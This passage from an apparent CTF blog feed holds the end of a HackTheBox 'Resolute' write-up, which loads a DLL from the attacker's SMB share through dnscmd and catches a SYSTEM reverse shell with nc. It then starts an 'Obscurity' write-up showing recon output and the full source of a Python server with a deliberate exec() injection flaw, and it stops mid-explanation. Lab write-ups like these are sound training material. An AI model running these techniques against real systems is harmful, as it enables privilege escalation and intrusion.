Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-8888-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure><p>Now we open our <code>nc</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Finally we should be able to inject our DLL:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; dnscmd  /config /serverlevelplugindll \\<span class="number">10.10</span>.<span class="number">10.10</span>\hg8\hg8.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br></pre></td></tr></table></figure><p>Then we restart the DNS service:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; sc.exe stop dns</span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">3</span>  STOP_PENDING</span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x1</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7530</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; sc.exe <span class="built_in">start</span> dns</span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7d0</span><br><span class="line">        PID                : <span class="number">648</span></span><br><span class="line">        FLAGS              :</span><br></pre></td></tr></table></figure><p>We can see our DLL being injected:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python smbserver.py -smb2support hg8 /home/hg8/share/</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.169,50246)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\RESOLUTE$ authenticated successfully</span><br><span class="line">[*] RESOLUTE$::MEGABANK:4141414141414141:9bbc3576f3dfc56f64db8c2e72c24699:010100000000000000cb8cfb1235d601e6de8a857f2b6d9f0000000001001000580058006f006300480064004200710003001000580058006f006300480064004200710002001000420055004a00700041004f004400690004001000420055004a00700041004f00440069000700080000cb8cfb1235d60106000400020000000800300030000000000000000000000000400000ca3799be54bd584fc02a5a66719df22dd96fdf85822b6023559be0d172ac9b5b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310038000000000000000000</span><br><span class="line">[*] Connecting Share(1:IPC$)</span><br><span class="line">[*] Connecting Share(2:hg8)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>And after a little wait a new connection appear on our reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.169:50247</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">type</span> C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">exxxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> SMB </tag>
            
            <tag> RPC </tag>
            
            <tag> crackmapexec </tag>
            
            <tag> evil-winrm </tag>
            
            <tag> resolute </tag>
            
            <tag> ldap </tag>
            
            <tag> ldapdomaindump </tag>
            
            <tag> enum4linux </tag>
            
            <tag> winrm </tag>
            
            <tag> dns </tag>
            
            <tag> dnsadmin </tag>
            
            <tag> dll </tag>
            
            <tag> dll injection </tag>
            
            <tag> msfvenom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Obscurity</title>
      <link href="/posts/obscurity/"/>
      <url>/posts/obscurity/</url>
      
        <content type="html"><![CDATA[<img width="587" alt="obscurity-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158295-30812b80-9887-11ea-970a-935c37992678.png"><p>Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a little crypto and misconfigurations. I wouldn’t say it’s an easy one but it’s a pretty good one for developers comfortable with Python and want to level up in CTF.</p><p><strong>Tl;Dr:</strong> The user flag consisted in grabbing the source code of the server running port 80, “reverse engineer” it to find a command injection flaw in its workflow. From there you achieve remote code execution as <code>www-data</code>. As <code>www-data</code> you can access <code>Robert</code> user <code>/home/</code> directory filed with a encrypted password reminder file and a “homemade” python encryption script. Reversing this script you can recover the password used to encrypt the password reminder file. Once decrypted you use this password in the file to pivot to <code>Robert</code> user and grab the flag.<br>The root flag was accessible by abusing another homemade python script used to get a shell as root, when reverse engineer it you discover the script temporary store all users password hashes to the <code>/tmp</code> folder when running but immediately deletes them. You can write a script to grab the hashes fast enough before they get deleted, crack the hash of root and connect with the <code>root</code> account to grab the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.168 obscurity.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC obscurity.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 09:56 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> obscurity.htb (10.10.10.168)</span><br><span class="line">Host is up (0.038s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   closed http</span><br><span class="line">8080/tcp open   http-proxy BadHTTPServer</span><br><span class="line">9000/tcp closed cslistener</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 16.09 seconds</span><br></pre></td></tr></table></figure><p>Bit less classic than usual, port 80 is closed, <code>nmap</code> return 9000 port which is closed (no idea what this is so we keep it in mind for later maybe).<br>The ssh port 22 is open and the 8080 one running <code>BadHTTPServer</code>… Intriguing.  </p><p>Let’s dig it on this “bad” server.<br>Opening <code>http://obsurity.htb:8080/</code> display the following website: </p><p><img src="https://user-images.githubusercontent.com/9076747/71549328-fee0f400-29bb-11ea-9df7-81ea1b4d4ae6.png" alt="obscurity"></p><p>Looking around we notice this interesting message:</p><blockquote><p>Message to server devs: the current source code for the web server is in ‘SuperSecureServer.py’ in the secret development directory.  </p></blockquote><p>Well, since we don’t have other entry point yet, let’s try to bruteforce our way to find this “secret” directory name.   </p><p>This time I decided to give <a href="https://github.com/ffuf/ffuf"><code>ffuf</code></a> (“a fast web fuzzer written in Go”) a try. It’s usage is pretty straightforward and similar to <code>wfuzz</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -w ~/SecLists/Discovery/Web-Content/big.txt -u <span class="string">&quot;http://obscurity.htb:8080/FUZZ/SuperSecureServer.py&quot;</span></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string">       v1.0-rc1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://obscurity.htb:8080/FUZZ/SuperSecureServer.py</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]</span></span><br><span class="line"><span class="string">:: Progress: [20470/20470] :: 222 req/sec :: Duration: [0:01:32] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure><p>Got it! The secret directory was <code>develop</code>. </p><p>Let’s open this <code>SuperSecureServer.py</code> to take a look:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">respTemplate = <span class="string">&quot;&quot;&quot;HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;</span></span><br><span class="line"><span class="string">Date: &#123;dateSent&#125;</span></span><br><span class="line"><span class="string">Server: &#123;server&#125;</span></span><br><span class="line"><span class="string">Last-Modified: &#123;modified&#125;</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string">Content-Type: &#123;contentType&#125;</span></span><br><span class="line"><span class="string">Connection: &#123;connectionType&#125;</span></span><br><span class="line"><span class="string">&#123;body&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">DOC_ROOT = <span class="string">&quot;DocRoot&quot;</span></span><br><span class="line">CODES = &#123;<span class="string">&quot;200&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">        <span class="string">&quot;304&quot;</span>: <span class="string">&quot;NOT MODIFIED&quot;</span>,</span><br><span class="line">        <span class="string">&quot;400&quot;</span>: <span class="string">&quot;BAD REQUEST&quot;</span>, <span class="string">&quot;401&quot;</span>: <span class="string">&quot;UNAUTHORIZED&quot;</span>, <span class="string">&quot;403&quot;</span>: <span class="string">&quot;FORBIDDEN&quot;</span>, <span class="string">&quot;404&quot;</span>: <span class="string">&quot;NOT FOUND&quot;</span>,</span><br><span class="line">        <span class="string">&quot;500&quot;</span>: <span class="string">&quot;INTERNAL SERVER ERROR&quot;</span>&#125;</span><br><span class="line">MIMES = &#123;<span class="string">&quot;txt&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;css&quot;</span>:<span class="string">&quot;text/css&quot;</span>, <span class="string">&quot;html&quot;</span>:<span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;png&quot;</span>: <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;jpg&quot;</span>:<span class="string">&quot;image/jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ttf&quot;</span>:<span class="string">&quot;application/octet-stream&quot;</span>,<span class="string">&quot;otf&quot;</span>:<span class="string">&quot;application/octet-stream&quot;</span>, <span class="string">&quot;woff&quot;</span>:<span class="string">&quot;font/woff&quot;</span>, <span class="string">&quot;woff2&quot;</span>: <span class="string">&quot;font/woff2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;js&quot;</span>:<span class="string">&quot;application/javascript&quot;</span>,<span class="string">&quot;gz&quot;</span>:<span class="string">&quot;application/zip&quot;</span>, <span class="string">&quot;py&quot;</span>:<span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;map&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, **kwargs</span>):</span></span><br><span class="line">        self.__dict__.update(kwargs)</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        self.dateSent = self.modified = now.strftime(<span class="string">&quot;%a, %d %b %Y %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringResponse</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> respTemplate.<span class="built_in">format</span>(**self.__dict__)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        self.good = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = self.parseRequest(request)</span><br><span class="line">            self.method = request[<span class="string">&quot;method&quot;</span>]</span><br><span class="line">            self.doc = request[<span class="string">&quot;doc&quot;</span>]</span><br><span class="line">            self.vers = request[<span class="string">&quot;vers&quot;</span>]</span><br><span class="line">            self.header = request[<span class="string">&quot;header&quot;</span>]</span><br><span class="line">            self.body = request[<span class="string">&quot;body&quot;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.good = <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        req = request.strip(<span class="string">&quot;\r&quot;</span>).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        method,doc,vers = req[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        header = req[<span class="number">1</span>:-<span class="number">3</span>]</span><br><span class="line">        body = req[-<span class="number">1</span>]</span><br><span class="line">        headerDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> header:</span><br><span class="line">            pos = param.find(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">            key, val = param[:pos], param[pos+<span class="number">2</span>:]</span><br><span class="line">            headerDict.update(&#123;key: val&#125;)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;method&quot;</span>: method, <span class="string">&quot;doc&quot;</span>: doc, <span class="string">&quot;vers&quot;</span>: vers, <span class="string">&quot;header&quot;</span>: headerDict, <span class="string">&quot;body&quot;</span>: body&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sock.bind((self.host, self.port))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listen</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client, address = self.sock.accept()</span><br><span class="line">            client.settimeout(<span class="number">60</span>)</span><br><span class="line">            threading.Thread(target = self.listenToClient,args = (client,address)).start()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listenToClient</span>(<span class="params">self, client, address</span>):</span></span><br><span class="line">        size = <span class="number">1024</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = client.recv(size)</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="comment"># Set the response to echo back the recieved data</span></span><br><span class="line">                    req = Request(data.decode())</span><br><span class="line">                    self.handleRequest(req, client, address)</span><br><span class="line">                    client.shutdown()</span><br><span class="line">                    client.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> error(<span class="string">&#x27;Client disconnected&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                client.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span>(<span class="params">self, request, conn, address</span>):</span></span><br><span class="line">        <span class="keyword">if</span> request.good:</span><br><span class="line"></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># print(str(request.method) + &quot; &quot; + str(request.doc), end=&#x27; &#x27;)</span></span><br><span class="line">                <span class="comment"># print(&quot;from &#123;0&#125;&quot;.format(address[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">            document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">            statusNum=document[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            document = self.serveDoc(<span class="string">&quot;/errors/400.html&quot;</span>, DOC_ROOT)</span><br><span class="line">            statusNum=<span class="string">&quot;400&quot;</span></span><br><span class="line">        body = document[<span class="string">&quot;body&quot;</span>]</span><br><span class="line">        statusCode=CODES[statusNum]</span><br><span class="line">        dateSent = <span class="string">&quot;&quot;</span></span><br><span class="line">        server = <span class="string">&quot;BadHTTPServer&quot;</span></span><br><span class="line">        modified = <span class="string">&quot;&quot;</span></span><br><span class="line">        length = <span class="built_in">len</span>(body)</span><br><span class="line">        contentType = document[<span class="string">&quot;mime&quot;</span>] <span class="comment"># Try and identify MIME type from string</span></span><br><span class="line">        connectionType = <span class="string">&quot;Closed&quot;</span></span><br><span class="line">        resp = Response(</span><br><span class="line">        statusNum=statusNum, statusCode=statusCode,</span><br><span class="line">        dateSent = dateSent, server = server,</span><br><span class="line">        modified = modified, length = length,</span><br><span class="line">        contentType = contentType, connectionType = connectionType,</span><br><span class="line">        body = body</span><br><span class="line">        )</span><br><span class="line">        data = resp.stringResponse()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        conn.send(data.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span>(<span class="params">self, path, docRoot</span>):</span></span><br><span class="line">        path = urllib.parse.unquote(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">            <span class="built_in">exec</span>(info.<span class="built_in">format</span>(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">            cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">            docRoot = os.path.join(cwd, docRoot)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                path = <span class="string">&quot;/index.html&quot;</span></span><br><span class="line">            requested = os.path.join(docRoot, path[<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(requested):</span><br><span class="line">                mime = mimetypes.guess_type(requested)</span><br><span class="line">                mime = (mime <span class="keyword">if</span> mime[<span class="number">0</span>] != <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">                mime = MIMES[requested.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>]]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(requested, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(requested, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                status = <span class="string">&quot;200&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                errorPage = os.path.join(docRoot, <span class="string">&quot;errors&quot;</span>, <span class="string">&quot;404.html&quot;</span>)</span><br><span class="line">                mime = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(errorPage, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    data = f.read().<span class="built_in">format</span>(path)</span><br><span class="line">                status = <span class="string">&quot;404&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            errorPage = os.path.join(docRoot, <span class="string">&quot;errors&quot;</span>, <span class="string">&quot;500.html&quot;</span>)</span><br><span class="line">            mime = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(errorPage, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">            status = <span class="string">&quot;500&quot;</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;body&quot;</span>: data, <span class="string">&quot;mime&quot;</span>: mime, <span class="string">&quot;status&quot;</span>: status&#125;</span><br></pre></td></tr></table></figure><p>The source code is worth reading, taking a bit of time to understand give some really interesting insight on the working of this http server.</p><h3 id="Remote-Code-Execution-gt-www-data-shell"><a href="#Remote-Code-Execution-gt-www-data-shell" class="headerlink" title="Remote Code Execution -&gt; www-data shell"></a>Remote Code Execution -&gt; www-data shell</h3><p>If you are used to python development (and ctf…), a line should quickly catch your eye:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(info.<span class="built_in">format</span>(path))</span><br></pre></td></tr></table></figure><p>As a reminded <a href="https://docs.python.org/3/library/functions.html#exec"><code>exec()</code></a> dynamically execute Python code passed as argument.<br>Like <code>eval()</code> it’s usage is <a 